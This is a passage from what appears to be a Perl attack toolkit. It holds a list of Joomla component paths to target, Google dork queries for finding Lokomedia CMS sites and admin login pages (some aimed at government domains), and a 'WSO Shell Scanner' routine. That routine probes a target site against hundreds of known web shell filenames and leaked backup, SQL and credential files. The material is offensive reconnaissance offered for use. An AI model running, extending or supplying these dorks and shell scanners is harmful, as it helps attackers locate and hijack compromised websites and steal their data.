index.php?option=com_mad
index.php?option=com_imagebrowser
index.php?option=com_user
index.php?option=com_ezstore
index.php?option=com_products
index.php?option=com_propertiesaid
index.php?option=com_qcontacts
index.php?option=com_quran
index.php?option=com_races
index.php?option=com_ranking
index.php?option=com_rd_download
index.php?option=com_realestatemanager
index.php?option=com_realtyna
index.php?option=com_redshop
index.php?option=com_remository
index.php?option=com_restaurantguide
index.php?option=com_rokdownloads
index.php?option=com_route
index.php?option=com_rwcards
index.php?option=com_s5clanroster
index.php?option=com_sbsfile
index.php?option=com_school
index.php?option=com_schools
index.php?option=com_dtregister
index.php?option=com_n
index.php?option=com_altas
index.php?option=com_vr
index.php?option=com_brightweblinks
index.php?option=com_versioning
index.php?option=com_xewebtv
index.php?option=com_jabode
index.php?option=com_netinvoice
index.php?option=com_expshop
index.php?option=com_yvcomment
index.php?option=com_joomladate
index.php?option=com_joomradio
index.php?option=com_eQuotes
index.php?option=com_acctexp
index.php?option=com_joobb
index.php?option=com_artist
index.php?option=com_xsstream
index.php?option=com_comprofiler
index.php?option=com_jpad
index.php?option=com_joomlaxplorer
index.php?option=com_onlineflashquiz
index.php?option=com_rekry
index.php?option=com_custompages
index.php?option=com_galeria
index.php?option=com_mcquiz
index.php?option=com_ynews
index.php?option=com_neoreferences
index.php?option=com_candle
index.php?option=com_joovideo
index.php?option=com_alberghi
index.php?option=com_restaurante
index.php?option=com_puarcade
index.php?option=com_jjgallery
index.php?option=com_jcs
index.php?option=com_mp
index.php?option=com_wmtportfolio
index.php?option=com_wmtgallery
index.php?option=com_panoramic
index.php?option=com_slideshow
index.php?option=com_joom
index.php?option=com_joomlaradiov
index.php?option=com_jombib
index.php?option=com_rsfiles
index.php?option=com_eventlist
index.php?option=com_gmaps
index.php?option=com_ponygallery
index.php?option=com_autostand
index.php?option=com_swmenufree
index.php?option=com_joomlaboard
index.php?option=com_webring
index.php?option=com_reporter
index.php?option=com_jeux
index.php?option=com_nfn
index.php?option=com_bayesiannaivefilter
index.php?option=com_doc
index.php?option=com_clasifier
index.php?option=com_hwdvideoshare
index.php?option=com_acajoom
index.php?option=com_facileforms
index.php?option=com_books
index.php?option=com_tophotelmodule
index.php?option=com_lowcosthotels
index.php?option=com_newsflash
index.php?option=com_gigcal
index.php?option=com_flashmagazinedeluxe
index.php?option=com_bookjoomlas
index.php?option=com_juser
index.php?option=com_moofaq
index.php?option=com_portafolio
index.php?option=com_projectfork
index.php?option=com_tickets
index.php?option=com_joomloads
index.php?option=com_ninjamonial
index.php?option=com_jtips
index.php?option=com_artportal
index.php?option=com_joomlub
index.php?option=com_joomloc
index.php?option=com_djcatalog
index.php?option=com_foobla_suggestions
index.php?option=com_reservations
index.php?option=com_chronoconnectivity
index.php?option=com_djartgallery
index.php?option=com_jmarket
index.php?option=com_jcommunity
index.php?option=com_cinema
index.php?option=com_answers
index.php?option=com_galleryxml
index.php?option=com_frontpage
index.php?option=com_google_maps
index.php?option=com_image
index.php?option=com_photos
index.php?option=com_picasa2gallery
index.php?option=com_ybggal
index.php?option=com_jcafe
index.php?option=com_jejob
index.php?option=com_sef
index.php?option=jesubmit
index.php?option=com_projectlog
index.php?option=com_reportcard
index.php?option=com_artforms
index.php?option=com_jomholiday
index.php?option=com_ownbiblio
index.php?option=com_tag
index.php?option=com_commedia
index.php?option=com_conference
index.php?option=com_realty
index.php?option=com_sobi2
index.php?option=com_jomdirectory
index.php?option=com_bnf
index.php?option=com_sport
index.php?option=com_personal
index.php?option=com_play
index.php?option=com_etree
index.php?option=com_file
index.php?option=com_bca-rss-syndicator
index.php?option=com_ckforms
index.php?option=com_datafeeds
index.php?option=com_fabrik
index.php?option=com_ganalytics
index.php?option=com_gcalendar
index.php?option=com_hsconfig
index.php?option=com_if_surfalert
index.php?option=com_janews
index.php?option=com_jfeedback
index.php?option=com_joomlapicasa2
index.php?option=com_jshopping
index.php?option=com_jvehicles
index.php?option=com_linkr
index.php?option=com_mmsblog
index.php?option=com_mscomment
index.php?option=com_ninjarsssyndicator
index.php?option=com_onlineexam
index.php?option=com_orgchart
index.php?option=com_properties
index.php?option=com_rpx
index.php?option=com_sectionex
index.php?option=com_simpledownload
index.php?option=com_userstatus
index.php?option=com_aquiz
index.php?option=com_as
index.php?option=com_as_shop
index.php?option=com_msg
index.php?option=com_club
modules/mod_simplefileuploadv1.3\n\n";
          
print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"] Lokomedia Dorks ";
print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"]\n\n
		  
nurl:statis-1-profil.html
inurl:statis-2-profil.html
inurl:statis-3-strukturorganisasi.html
intext:lokomedia inurl:statis- ext:html
intext:lokomedia inurl:kategori- 6 - .html
intext:lokomedia inurl:semua- ext:html
inurl:kategori-32-daerah.html site:.com
intext:copyright by  inurl:statis-1 ext:html
intext:lokomedia inurl:statis- ext:html
intext:lokomedia inurl:semua- ext:html
intext:lokomedia inurl:hubungi- ext:html
intext:lokomedia inurl:kategori- ext:html
intext:lokomedia inurl:berita- ext:html
inurl:foto_info
inurl:foto_produk intext:shop
inurl:foto_banner intext:shop
inurl:foto_berita intext:shop
inurl:foto_user intext:shop
inurl:/adminweb/login 
inurl:content.php?module=banner
inurl:content.php?module=user
inurl:content.php?module=berita
inurl:content.php?module=iklan
inurl:content.php?module=produk
intext:copyright @ inurl:/berita- - ext:html site:.
intext:Kembali ke Website Utama
intext:Developed by  inurl:berita- ext:html
inurl:/statis-1- ext:html site:.
inurl:/statis-10 ext:html
inurl:/statis-16 ext:html
intext:copyright @ inurl:/berita- - ext:html site:.
intext:Kembali ke Website Utama
intext:Developed by  inurl:berita- ext:html
intext:copyright by  inurl:statis-1 ext:html
inurl:/semua-berita.html site:coli :V 
intext:copyright @ inurl:/berita- - ext:html site:.
intext:Kembali ke Website Utama
intext:Developed by  inurl:berita- ext:html
inurl:/statis-1- ext:html site:.
inurl:/statis-1- ext:html site:.com/net/id/coli :V
Copyright � 2013 by Polostama. All rights reserved.
inurl:media.php?module=home\n\n";

print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"]DORK ADMIN PAGE LOGIN ";
print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"]\n\n

intext:Developed by  inurl:berita- ext:html
intitle:.:: Administrator -  Website ::. intext:LOGIN ADMINISTRATOR 
intittle:adminstration login lokomedia site:+your country
intitle:.:: Administrator -  Website ::. intext:LOGIN ADMINISTRATOR site:+your country
intittle:adminstration login lokomedia site:+your country
intitle:.:: Administrator -  Website ::. intext:LOGIN ADMINISTRATOR site:+your country
intittle:Administrator CMS Lokomedia
intittle:..::: Login Anggota :::..
intitle:.:: HALAMAN ADMINISTRATOR ::.
intittle:..::: Login Elearning :::..
intittle:..::: Login Administrator :::.. site:+your country
intittle:.:: Login Adminstration ::. site:+your country
intittle:..::: Login Sistem ::.. site:+your country
intittle:.:: ADMINISTRATOR LOGIN ::. site:+your country
intittle:adminstration > login site:+your country
intittle:adminstration > Website site:+your country
intitle:Panel Administrator
inur:.com/adminweb 
inur:.org/adminweb 
inur:.net/adminweb 
inur:.go.id/adminweb 
inur:.desa.id/adminweb 
inur:.co.id/adminweb 
inur:.web.id/adminweb 
inur:/adminweb 

put all this in file txt === > ";
print color("blue"),"Dorks.txt then run script again and choose 1\n\n";

open(save, '>>Dorks.txt');
    print save "$link\n";
    close(save);
}
}











#########################################################################################
##################################### WSO Shell Scanner #################################
#########################################################################################
sub shellscan() {
print " Enter Site : ";
$site=<STDIN>;
chomp $site;
 
if($site !~ /http:\/\//) { $site = "$site/"; };
 
print "\n";
@path = ('WSO.php','1998.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','13.php','sql.php','mysql.php','config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.rar'.'wp-content/plugins/disqus-comment-system/disqus.php',
'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','indoxploit.php','IndoXploit.php','andela.php','mini.php','info.php','egyshell.php','Sym.php','c22.php','c100.php',
'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.rar','vb.rar',
'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
'/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
'/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.rar','/home.rar','/home.tar','/home.tar.gz',
'/forum.rar','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.rar','Symlink.php','Symlink.pl',
'forum.rar','joomla.rar','joomla.rar','wp.php','buck.sql','sysadmin.php','images/c99.php', 'xd.php', 'c100.php',
'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.rar','/wp-content/plugins/disqus-comment-system/WSO.php',
'/images/root.php',
'/COPYRIGHT.php',
'/images/root.php',
'/wp-content/plugins/disqus-comment-system/Sym.php',
'/wp-content/plugins/disqus-comment-system/c22.php',
'/wp-includes/wp-footer.php',
'/wp-content/plugins/disqus-comment-system/c100.php',
'/wp-content/plugins/disqus-comment-system/configuration.php',
'/wp-content/plugins/disqus-comment-system/g.php',
'/wp-content/plugins/disqus-comment-system/xx.pl',
'/wp-content/plugins/disqus-comment-system/ls.php',
'/wp-content/plugins/disqus-comment-system/Cpanel.php',
'/wp-content/plugins/disqus-comment-system/k.php',
'/wp-content/plugins/disqus-comment-system/zone-h.php',
'/wp-content/plugins/disqus-comment-system/tmp/user.php',
'/wp-content/plugins/disqus-comment-system/tmp/Sym.php',
'/wp-content/plugins/disqus-comment-system/cp.php',
'/wp-content/plugins/disqus-comment-system/tmp/madspotshell.php',
'/wp-content/plugins/disqus-comment-system/tmp/root.php',
'/wp-content/plugins/disqus-comment-system/tmp/whmcs.php',
'/wp-content/plugins/disqus-comment-system/tmp/index.php',
'/wp-content/plugins/disqus-comment-system/tmp/2.php',
'/wp-content/plugins/disqus-comment-system/tmp/dz.php',
'/wp-content/plugins/disqus-comment-system/tmp/cpn.php',
'/wp-content/plugins/disqus-comment-system/tmp/changeall.php',
'/wp-content/plugins/disqus-comment-system/tmp/Cgishell.pl',
'/wp-content/plugins/disqus-comment-system/tmp/sql.php',
'/wp-content/plugins/disqus-comment-system/0day.php',
'/wp-content/plugins/disqus-comment-system/tmp/admin.php',
'/wp-content/plugins/disqus-comment-system/L3b.php',
'/wp-content/plugins/disqus-comment-system/d.php',
'/wp-content/plugins/disqus-comment-system/tmp/d.php',
'/wp-content/plugins/disqus-comment-system/tmp/L3b.php',
'/wp-content/plugins/disqus-comment-system/sado.php',
'/wp-content/plugins/disqus-comment-system/admin1.php',
'wp-content/plugins/akismet/WSO.php',
'wp-content/plugins/akismet/dz.php',
'wp-content/plugins/akismet/DZ.php',
'wp-content/plugins/akismet/cpanel.php',
'wp-content/plugins/akismet/cpn.php',
'wp-content/plugins/akismet/sos.php',
'wp-content/plugins/akismet/term.php',
'wp-content/plugins/akismet/Sec-War.php',
'wp-content/plugins/akismet/sql.php',
'wp-content/plugins/akismet/ssl.php',
'wp-content/plugins/akismet/info.php',
'wp-content/plugins/akismet/egyshell.php',
'wp-content/plugins/akismet/Sym.php',
'wp-content/plugins/akismet/c22.php',
'wp-content/plugins/akismet/c100.php',
'wp-content/plugins/akismet/configuration.php',
'wp-content/plugins/akismet/g.php',
'wp-content/plugins/akismet/xx.pl',
'wp-content/plugins/akismet/ls.php',
'wp-content/plugins/akismet/Cpanel.php',
'wp-content/plugins/akismet/k.php',
'wp-content/plugins/akismet/zone-h.php',
'wp-content/plugins/akismet/tmp/user.php',
'wp-content/plugins/akismet/tmp/Sym.php',
'wp-content/plugins/akismet/cp.php',
'wp-content/plugins/akismet/tmp/madspotshell.php',
'wp-content/plugins/akismet/tmp/root.php',
'wp-content/plugins/akismet/tmp/whmcs.php',
'wp-content/plugins/akismet/tmp/index.php',
'wp-content/plugins/akismet/tmp/2.php',
'wp-content/plugins/akismet/tmp/dz.php',
'wp-content/plugins/akismet/tmp/cpn.php',
'wp-content/plugins/akismet/tmp/changeall.php',
'wp-content/plugins/akismet/tmp/Cgishell.pl',
'wp-content/plugins/akismet/tmp/sql.php',
'wp-content/plugins/akismet/0day.php',
'wp-content/plugins/akismet/tmp/admin.php',
'wp-content/plugins/akismet/L3b.php',
'wp-content/plugins/akismet/d.php',
'wp-content/plugins/akismet/tmp/d.php',
'wp-content/plugins/akismet/tmp/L3b.php',
'wp-content/plugins/akismet/sado.php',
'wp-content/plugins/akismet/admin1.php',
'wp-content/plugins/akismet/upload.php',
'wp-content/plugins/akismet/up.php',
'wp-content/plugins/akismet/vb.rar',
'wp-content/plugins/akismet/vb.rar',
'wp-content/plugins/akismet/admin2.asp',
'wp-content/plugins/akismet/uploads.php',
'wp-content/plugins/akismet/sa.php',
'wp-content/plugins/akismet/sysadmins/',
'wp-content/plugins/akismet/admin1/',
'wp-content/plugins/akismet/sniper.php',
'wp-content/plugins/akismet//ftp.txt',
'wp-content/plugins/akismet//user.txt',
'wp-content/plugins/akismet//site.txt',
'wp-content/plugins/akismet//error_log',
'wp-content/plugins/akismet//error',
'wp-content/plugins/akismet//cpanel',
'wp-content/plugins/akismet//awstats',
'wp-content/plugins/akismet//site.sql',
'wp-content/plugins/akismet//vb.sql',
'wp-content/plugins/akismet//forum.sql',
'wp-content/plugins/akismet/r00t-s3c.php',
'wp-content/plugins/akismet/c.php',
'wp-content/plugins/akismet//backup.sql',
'wp-content/plugins/akismet//back.sql',
'wp-content/plugins/akismet//data.sql',
'wp-content/plugins/akismet/wp.rar/',
'wp-content/plugins/akismet/asp.aspx',
'wp-content/plugins/akismet/tmp/vaga.php',
'wp-content/plugins/akismet/tmp/killer.php',
'wp-content/plugins/akismet/whmcs.php',
'wp-content/plugins/akismet/abuhlail.php',
'wp-content/plugins/akismet/tmp/killer.php',
'wp-content/plugins/akismet/tmp/domaine.pl',
'wp-content/plugins/akismet/tmp/domaine.php',
'wp-content/plugins/akismet/useradmin/',
'wp-content/plugins/akismet/tmp/d0maine.php',
'wp-content/plugins/akismet/d0maine.php',
'wp-content/plugins/akismet/tmp/sql.php',
'wp-content/plugins/akismet/X.php',
'wp-content/plugins/akismet/123.php',
'wp-content/plugins/akismet/m.php',
'wp-content/plugins/akismet/b.php',
'wp-content/plugins/akismet/up.php',
'wp-content/plugins/akismet/tmp/dz1.php',
'wp-content/plugins/akismet/dz1.php',
'wp-content/plugins/akismet/forum.rar',
'wp-content/plugins/akismet/Symlink.php',
'wp-content/plugins/akismet/Symlink.pl',
'wp-content/plugins/akismet/forum.rar',
'wp-content/plugins/akismet/joomla.rar',
'wp-content/plugins/akismet/joomla.rar',
'wp-content/plugins/akismet/wp.php',
'wp-content/plugins/akismet/buck.sql',
'wp-content/plugins/akismet/sysadmin.php',
'wp-content/plugins/akismet/images/c99.php',
'wp-content/plugins/akismet/xd.php',
'wp-content/plugins/akismet/c100.php',
'wp-content/plugins/akismet/spy.aspx',
'wp-content/plugins/akismet/xd.php',
'wp-content/plugins/akismet/tmp/xd.php',
'wp-content/plugins/akismet/sym/root/home/',
'wp-content/plugins/akismet/billing/killer.php',
'wp-content/plugins/akismet/tmp/upload.php',
'wp-content/plugins/akismet/tmp/admin.php',
'wp-content/plugins/akismet/Server.php',
'wp-content/plugins/akismet/tmp/uploads.php',
'wp-content/plugins/akismet/tmp/up.php',
'wp-content/plugins/akismet/Server/',
'wp-content/plugins/akismet/wp-admin/c99.php',
'wp-content/plugins/akismet/tmp/priv8.php',
'wp-content/plugins/akismet/priv8.php',
'wp-content/plugins/akismet/cgi.pl/',
'wp-content/plugins/akismet/tmp/cgi.pl',
'wp-content/plugins/akismet/downloads/dom.php',
'wp-content/plugins/akismet/webadmin.html',
'wp-content/plugins/akismet/admins.php',
'wp-content/plugins/akismet/bluff.php',
'wp-content/plugins/akismet/king.jeen',
'wp-content/plugins/akismet/admins/',
'wp-content/plugins/akismet/admins.asp',
'wp-content/plugins/akismet/admins.php',
'wp-content/plugins/akismet/wp.rar',
'wp-content/plugins/akismet/disqus.php',
'wp-content/plugins/google-sitemap-generator//cpanel',
'wp-content/plugins/google-sitemap-generator//awstats',
'wp-content/plugins/google-sitemap-generator//site.sql',
'wp-content/plugins/google-sitemap-generator//vb.sql',
'wp-content/plugins/google-sitemap-generator//forum.sql',
'wp-content/plugins/google-sitemap-generator/r00t-s3c.php',
'wp-content/plugins/google-sitemap-generator/c.php',
'wp-content/plugins/google-sitemap-generator//backup.sql',
'wp-content/plugins/google-sitemap-generator//back.sql',
'wp-content/plugins/google-sitemap-generator//data.sql',
'wp-content/plugins/google-sitemap-generator/wp.rar/',
'wp-content/plugins/google-sitemap-generator/asp.aspx',
'wp-content/plugins/google-sitemap-generator/tmp/xd.php',
'wp-content/plugins/google-sitemap-generator/sym/root/home/',
'wp-content/plugins/google-sitemap-generator/billing/killer.php',
'wp-content/plugins/google-sitemap-generator/tmp/upload.php',
'wp-content/plugins/google-sitemap-generator/tmp/admin.php',
'wp-content/plugins/google-sitemap-generator/Server.php',
'wp-content/plugins/google-sitemap-generator/tmp/uploads.php',
'wp-content/plugins/google-sitemap-generator/tmp/up.php',
'wp-content/plugins/google-sitemap-generator/Server/',
'wp-content/plugins/google-sitemap-generator/wp-admin/c99.php',
'wp-content/plugins/google-sitemap-generator/tmp/priv8.php',
'wp-content/plugins/google-sitemap-generator/priv8.php',
'wp-content/plugins/google-sitemap-generator/cgi.pl/',
'wp-content/plugins/google-sitemap-generator/tmp/cgi.pl',
'wp-content/plugins/google-sitemap-generator/downloads/dom.php',
'wp-content/plugins/google-sitemap-generator/webadmin.html',
'wp-content/plugins/google-sitemap-generator/admins.php',
'wp-content/plugins/google-sitemap-generator/bluff.php',
'wp-content/plugins/google-sitemap-generator/king.jeen',
'wp-content/plugins/google-sitemap-generator/admins/',
'wp-content/plugins/google-sitemap-generator/admins.asp',
'wp-content/plugins/google-sitemap-generator/admins.php',
'wp-content/plugins/google-sitemap-generator/wp.rar',
'wp-content/plugins/google-sitemap-generator/sitemap-core.php',
'/templates/beez/WSO.php',
'/templates/beez/dz.php',
'/templates/beez/DZ.php',
'/templates/beez/cpn.php',
'/templates/beez/sos.php',
'/templates/beez/term.php',
'/templates/beez/Sec-War.php',
'/templates/beez/sql.php',
'/templates/beez/ssl.php',
'/templates/beez/mysql.php',
'/templates/beez/WolF.php',
'/templates/beez/configuration.php',
'/templates/beez/g.php',
'/templates/beez/xx.pl',
'/templates/beez/ls.php',
'/templates/beez/Cpanel.php',
'/templates/beez/k.php',
'/templates/beez/zone-h.php',
'/templates/beez/tmp/user.php',
'/templates/beez/tmp/Sym.php',
'/templates/beez/cp.php',
'/templates/beez/tmp/madspotshell.php',
'/templates/beez/tmp/root.php',
'/templates/beez/tmp/whmcs.php',
'/templates/beez/tmp/index.php',
'/templates/beez/tmp/2.php',
'/templates/beez/tmp/dz.php',
'/templates/beez/tmp/cpn.php',
'/templates/beez/tmp/changeall.php',
'/templates/beez/tmp/Cgishell.pl',
'/templates/beez/tmp/sql.php',
'/templates/beez/0day.php',
'/templates/beez/tmp/admin.php',
'/templates/beez/L3b.php',
'/templates/beez/d.php',
'/templates/beez/tmp/d.php',
'/templates/beez/tmp/L3b.php',
'/templates/beez/sado.php',
'/templates/beez/admin1.php',
'/templates/beez/upload.php',
'/templates/beez/up.php',
'/templates/beez/vb.rar',
'/templates/beez/vb.rar',
'/templates/beez/admin2.asp',
'/templates/beez/uploads.php',
'/templates/beez/sa.php',
'/templates/beez/sysadmins/',
'/templates/beez/admin1/',
'/templates/beez/sniper.php',
'/templates/beez/images/Sym.php',
'/templates/beez//r57.php',
'/templates/beez/gzaa_spysl',
'/templates/beez/sql-new.php',
'/templates/beez//shell.php',
'/templates/beez//sa.php',
'/templates/beez//admin.php',
'/templates/beez//sa2.php',
'/templates/beez//2.php',
'/templates/beez//gaza.php',
'/templates/beez//up.php',
'/templates/beez//upload.php',
'/templates/beez//uploads.php',
'/templates/beez/shell.php',
'/templates/beez//amad.php',
'/templates/beez//t00.php',
'/templates/beez//dz.php',
'/templates/beez//site.rar',
'/templates/beez//Black.php',
'/templates/beez//site.tar.gz',
'/templates/beez//home.rar',
'/templates/beez//home.rar',
'/templates/beez//home.tar',
'/templates/beez//home.tar.gz',
'/templates/beez//forum.rar',
'/templates/beez//forum.rar',
'/templates/beez//forum.tar',
'/templates/beez//forum.tar.gz',
'/templates/beez//test.txt',
'/templates/beez//ftp.txt',
'/templates/beez//user.txt',
'/templates/beez//site.txt',
'/templates/beez//error_log',
'/templates/beez//error',
'/templates/beez//cpanel',
'/templates/beez//awstats',
'/templates/beez//site.sql',
'/templates/beez//vb.sql',
'/templates/beez//forum.sql',
'/templates/beez/r00t-s3c.php',
'/templates/beez/c.php',
'/templates/beez//backup.sql',
'/templates/beez//back.sql',
'/templates/beez//data.sql',
'/templates/beez/wp.rar/',
'/templates/beez/asp.aspx',
'/templates/beez/tmp/vaga.php',
'/templates/beez/tmp/killer.php',
'/templates/beez/whmcs.php',
'/templates/beez/abuhlail.php',
'/templates/beez/tmp/killer.php',
'/templates/beez/tmp/domaine.pl',
'/templates/beez/tmp/domaine.php',
'/templates/beez/useradmin/',
'/templates/beez/tmp/d0maine.php',
'/templates/beez/d0maine.php',
'/templates/beez/tmp/sql.php',
'/templates/beez/X.php',
'/templates/beez/123.php',
'/templates/beez/m.php',
'/templates/beez/b.php',
'/templates/beez/up.php',
'/templates/beez/tmp/dz1.php',
'/templates/beez/dz1.php',
'/templates/beez/forum.rar',
'/templates/beez/Symlink.php',
'/templates/beez/Symlink.pl',
'/templates/beez/forum.rar',
'/templates/beez/joomla.rar',
'/templates/beez/joomla.rar',
'/templates/beez/wp.php',
'/templates/beez/buck.sql',
'/templates/beez/sysadmin.php',
'/templates/beez/images/c99.php',
'/templates/beez/xd.php',
'/templates/beez/c100.php',
'/templates/beez/spy.aspx',
'/templates/beez/xd.php',
'/templates/beez/tmp/xd.php',
'/templates/beez/sym/root/home/',
'/templates/beez/billing/killer.php',
'/templates/beez/tmp/upload.php',
'/templates/beez/tmp/admin.php',
'/templates/beez/Server.php',
'/templates/beez/tmp/uploads.php',
'/templates/beez/tmp/up.php',
'/templates/beez/Server/',
'/templates/beez/wp-admin/c99.php',
'/templates/beez/tmp/priv8.php',
'/templates/beez/priv8.php',
'/templates/beez/cgi.pl/',
'/templates/beez/tmp/cgi.pl',
'/templates/beez/downloads/dom.php',
'/templates/beez/webadmin.html',
'/templates/beez/admins.php',
'/templates/beez/bluff.php',
'/templates/beez/king.jeen',
'/templates/beez/admins/',
'/templates/beez/admins.asp',
'/templates/beez/admins.php',
'/templates/beez/wp.rar',
'/templates/beez/index.php','/images/WSO.php',
'/images/dz.php',
'/images/DZ.php',
'/images/cpanel.php',
'/images/cpn.php',
'/images/sos.php',
'/images/term.php',
'/images/Sec-War.php',
'/images/sql.php',
'/images/ssl.php',
'/images/mysql.php',
'/images/WolF.php',
'/images/madspot.php',
'/images/Cgishell.pl',
'/images/killer.php',
'/images/changeall.php',
'/images/2.php',
'/images/Sh3ll.php',
'/images/dz0.php',
'/images/dam.php',
'/images/user.php',
'/images/dom.php',
'/images/whmcs.php',
'/images/vb.rar',
'/images/sa.php',
'/images/sysadmins/',
'/images/admin1/',
'/images/sniper.php',
'/images/images/Sym.php',
'/images//r57.php',
'/images/gzaa_spysl',
'/images/sql-new.php',
'/images//shell.php',
'/images//sa.php',
'/images//admin.php',
'/images//sa2.php',
'/images//2.php',
'/images//user.txt',
'/images//site.txt',
'/images//error_log',
'/images//error',
'/images//cpanel',
'/images//awstats',
'/images//site.sql',
'/images//vb.sql',
'/images//forum.sql',
'/images/r00t-s3c.php',
'/images/c.php',
'/images//backup.sql',
'/images//back.sql',
'/images//data.sql',
'/images/wp.rar/',
'/images/asp.aspx',
'/images/tmp/vaga.php',
'/images/tmp/killer.php',
'/images/whmcs.php',
'/images/abuhlail.php',
'/images/tmp/killer.php',
'/images/tmp/domaine.pl',
'/images/tmp/domaine.php',
'/images/useradmin/',
'/images/tmp/d0maine.php',
'/images/d0maine.php',
'/images/tmp/sql.php',
'/images/X.php',
'/images/123.php',
'/images/m.php',
'/images/b.php',
'/images/up.php',
'/images/tmp/dz1.php',
'/images/dz1.php',
'/images/forum.rar',
'/images/Symlink.php',
'/images/Symlink.pl',
'/images/forum.rar',
'/images/joomla.rar',
'/images/joomla.rar',
'/images/wp.php',
'/images/buck.sql',
'/includes/WSO.php',
'/includes/dz.php',
'/includes/DZ.php',
'/includes/cpanel.php',
'/includes/cpn.php',
'/includes/sos.php',
'/includes/term.php',
'/includes/Sec-War.php',
'/includes/sql.php',
'/includes/ssl.php',
'/includes/mysql.php',
'/includes/WolF.php',
'/includes/madspot.php',
'/includes/Cgishell.pl',
'/includes/killer.php',
'/includes/changeall.php',
'/includes/2.php',
'/includes/Sh3ll.php',
'/includes/dz0.php',
'/includes/dam.php',
'/includes/user.php',
'/includes/dom.php',
'/includes/whmcs.php',
'/includes/vb.rar',
'/includes/r00t.php',
'/includes/c99.php',
'/includes/gaza.php',
'/includes/1.php',
'/includes/d0mains.php',
'/includes/madspotshell.php',
'/includes/info.php',
'/includes/egyshell.php',
'/includes/Sym.php',
'/includes/c22.php',
'/includes/c100.php',
'/includes/configuration.php',
'/includes/g.php',
'/includes/xx.pl',
'/includes/ls.php',
'/includes/Cpanel.php',
'/includes/k.php',
'/includes/zone-h.php',
'/includes/tmp/user.php',
'/includes/tmp/Sym.php',
'/includes/cp.php',
'/includes/tmp/madspotshell.php',
'/includes/tmp/root.php',
'/includes/tmp/whmcs.php',
'/includes/tmp/index.php',
'/includes/tmp/2.php',
'/includes/tmp/dz.php',
'/includes/tmp/cpn.php',
'/includes/tmp/changeall.php',
'/includes/tmp/Cgishell.pl',
'/includes/tmp/sql.php',
'/includes/0day.php',
'/includes/tmp/admin.php',
'/includes/L3b.php',
'/includes/d.php',
'/includes/tmp/d.php',
'/includes/tmp/L3b.php',
'/includes/sado.php',
'/includes/admin1.php',
'/includes/upload.php',
'/includes/up.php',
'/includes/vb.rar',
'/includes/vb.rar',
'/includes/admin2.asp',
'/includes/uploads.php',
'/includes/sa.php',
'/includes/sysadmins/',
'/includes/admin1/',
'/includes/sniper.php',
'/includes/images/Sym.php',
'/includes//r57.php',
'/includes/gzaa_spysl',
'/includes/sql-new.php',
'/includes//shell.php',
'/includes//sa.php',
'/includes//admin.php',
'/includes//sa2.php',
'/includes//2.php',
'/includes//gaza.php',
'/includes//up.php',
'/includes//upload.php',
'/includes//uploads.php',
'/includes/shell.php',
'/includes//amad.php',
'/includes//t00.php',
'/includes//dz.php',
'/includes//site.rar',
'/includes//Black.php',
'/includes//site.tar.gz',
'/includes//home.rar',
'/includes//home.rar',
'/includes//home.tar',
'/includes//home.tar.gz',
'/includes//forum.rar',
'/includes//forum.rar',
'/includes//forum.tar',
'/includes//forum.tar.gz',
'/includes//test.txt',
'/includes//ftp.txt',
'/includes//user.txt',
'/includes//site.txt',
'/includes//error_log',
